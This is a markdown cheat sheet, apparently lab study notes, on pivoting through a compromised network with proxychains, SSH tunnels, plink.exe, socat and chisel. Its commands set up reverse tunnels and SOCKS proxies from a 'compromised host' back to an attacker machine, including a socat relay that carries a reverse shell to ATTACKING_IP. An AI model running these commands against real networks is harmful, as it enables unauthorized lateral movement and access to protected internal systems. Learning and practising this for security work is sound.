## Proxy Chains 
Proxychains is a command line tool which is activated by prepending the command proxychains to other commands. For example, to proxy netcat  through a proxy, you could use the command:
**proxychains nc 172.16.0.10 23**<br>

## SSH Tunneling
### Forward Connection
Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:<br>
**ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN**<p>
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine. For example, by entering **localhost:8000** into a web browser.<p>
Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. An example of this command would be:<br>
**ssh -D 1337 user@172.16.0.5 -fN** </p>

### Revesere Connection

1. ssh-KeyGen
2. Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
3. On a new line, type the following line, then paste in the public key:
**command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty**

4. sudo systemctl status ssh
5. sudo systemctl start ssh

 To put that into the context of our fictitious **IPs: 172.16.0.10 and 172.16.0.5**, if we have a shell on 172.16.0.5 and want to give **our attacking box (172.16.0.20)** access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:
**ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN**

  
## plink.exe
Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client.<br>
if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:<br>
**cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N**<br>
**Note:-** any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool

## Socat

The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target.<br>
Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.<br>we are using socat to create a relay for us to send a reverse shell back to our own attacking machine.<br>start a standard netcat listener on our attacking box.<br>Next, on the compromised server, use the following command to start the relay:<br>
**./socat tcp-l:8000 tcp:ATTACKING_IP:443 &**

### PORT FORWARD EASY

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server.<br>
if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command
<br>
**./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &**

### PORT FORWARD QUIET
1. socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
2. Next, on the compromised relay server
3. ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

## Chisel

used to quickly and easily set up a tunnelled proxy or port forward through a compromised system,**regardless of whether you have SSH access or not**.<br>
### Reverse SOCKS Proxy
On our own attacking box we would use a command that looks something like this:<br>
**./chisel server -p LISTEN_PORT --reverse &**<br>
On the compromised host, we would use the following command:<br>
**./chisel client ATTACKING_IP:LISTEN_PORT R:socks &**<br>
### Forward SOCKS Proxy
First, on the compromised host we would use:<br>
**./chisel server -p LISTEN_PORT --socks5**<br>
On our own attacking box we would then use:<br>
**./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks**<br><br>
_For example, **./chisel client 172.16.0.10:8080 1337:socks** would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine._

### REMOTE PORT FORWARDING
For a remote port forward, on our attacking machine we use the exact same command as before:<br>
**./chisel server -p LISTEN_PORT --reverse &**<br>
On the compromised host:<br>
**./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &**<br><br>
 the distinction between the **LISTEN_PORT** and the **LOCAL_PORT**. Here the **LISTEN_PORT** is the port that we started the chisel server on, and the **LOCAL_PORT** is the port we wish to open on our own attacking machine to link with the desired **target port**.
 
 ### LOCAL PORT FORWARDING
 On the compromised target we set up a chisel server:<br>
**./chisel server -p LISTEN_PORT**<br>
We now connect to this from our attacking machine like so:<br>
**./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT**<br>
